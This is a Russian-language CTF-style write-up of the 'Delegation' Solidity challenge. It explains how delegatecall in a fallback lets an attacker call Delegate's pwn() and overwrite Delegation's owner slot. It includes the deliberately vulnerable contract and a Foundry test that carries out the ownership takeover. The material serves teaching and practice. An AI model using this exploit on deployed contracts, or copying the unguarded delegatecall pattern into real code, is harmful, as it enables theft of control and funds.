# 6. Delegation
Контракт `Delegation` делегирует выполнение другому контракту (`Delegate`) если функция не найдена (то есть вызвана `fallback()`).
Таким образом, если в контракте, которому происходит делегирование, есть незащищенные чувствительные функции, ими можно манипулировать.

Также, важно заметить функциональные особенности низкоуровневой функции `delegatecall`: берется код из функции `Delegate`, но выполняется она в контексте `Delegation`. То есть, при изменении казалось бы переменных в одном контракте, из-за особенностей хранения они изменяются в другом контракте.
Переменные отображаются на слоты и при изменении виден именно слот.

Код контракта `Delegation.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

Пытаясь вызвать функцию, которой нет в `Delegation`, в `msg.data` у нас формируется ее идентификатор функции, который из-за логики `fallback()` функции будет искать ее в `Delegate`.

Проверка эксплоита `Delegation.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Delegation, Delegate} from "src/Delegation/Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function test__Exploit() public {
        assertEq(owner, delegation.owner());

        vm.startPrank(attacker);
        (bool success, ) = address(delegation).call{value: 0}(
            abi.encodeWithSignature("pwn()")
        );
        vm.stopPrank();

        assertEq(success, true);
        assertEq(attacker, delegation.owner());
    }
}
```